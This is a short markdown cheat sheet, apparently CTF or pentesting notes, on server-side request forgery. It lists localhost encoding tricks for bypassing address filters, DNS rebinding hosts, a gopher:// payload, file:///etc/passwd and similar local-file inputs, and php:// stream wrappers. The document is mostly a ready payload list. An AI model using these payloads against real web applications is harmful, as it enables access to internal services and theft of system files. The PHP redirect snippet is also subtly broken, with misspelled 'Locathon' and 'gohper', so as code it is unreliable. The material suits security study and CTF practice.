# Tool


## Web


### Reference
* [WEB CTF CheatSheet](https://github.com/w181496/Web-CTF-Cheatsheet/blob/master/README.md#%E7%A9%BA%E7%99%BD%E7%B9%9E%E9%81%8E)
* [Basic Concept of Penetration Testing](https://hackmd.io/@boik/ryf5wZM5Q#/)
* [Awesome Web Security](https://github.com/qazbnm456/awesome-web-security)
* [SSRF Bible](https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit)


### Sensitive files

* [git-dumper](https://github.com/arthaud/git-dumper)  

  > A tool to dump a git repository from a website.


### IP/Domain Bypass
* Representation
  * 127.0.0.1
  * localhost
  * 127.0.1
  * 127.1
  * 0.0.0.0
  * 0

* Encode
  * 2130706443 (dec)
  * 0x7f00000001 (hex)
  * 0x7f.0x0.0x0.0x1
  * 0177000000001 (oct)
  * 0177.0.0.01

* IPv6
  * ::1
  * ::127.0.0.1
  * ::ffff:127.0.0.1
  * [::]
  * ip6-localhost

* Unicode (browser)
  * http://ⓀⒶⒾⒷⓇⓄ.ⓉⓌ

* Third party
  * 127.0.0.1.xip.io

    > A record: 127.0.0.1

  * foo.bar.10.0.0.1.xip.io
  * A.54.87.54.87.1time.127.0.0.1.forever.rebind.network

    > DNS rebinding service

  * 36573657.7f000001.rbndr.us

    > DNS rebinding service

* 302 Bypass

  > If the environment does not block http redirect, query your own web server which respond
  >
  > ```php
  > <?php
  >   Header("Locathon: gohper://127.0.0.1:9000/_...")
  > ?>
  > ```


### Scheme
* Gopher
  > Simulate most tcp connections with no interactive.

  * `gopher://127.0.0.1:5487/_AB%0d%0aCD`

    > `<scheme>://<authority>/<padding><payload>`

  * [Gopher Payload Generator](https://github.com/tarunkant/Gopherus)

* Local File Scheme
  * `file:///etc/passwd`
  * `file://localhost/etc/passwd`
  * `local_file:///etc/passwd` (Python 2.7)
  * `file:///var/www/html/` (JAVA)
  * `netdoc:///var/www/html/` (JAVA)

* PHP Stream Wrapper
  * `php://filter`
  * `php://input`
  * `php://fd`

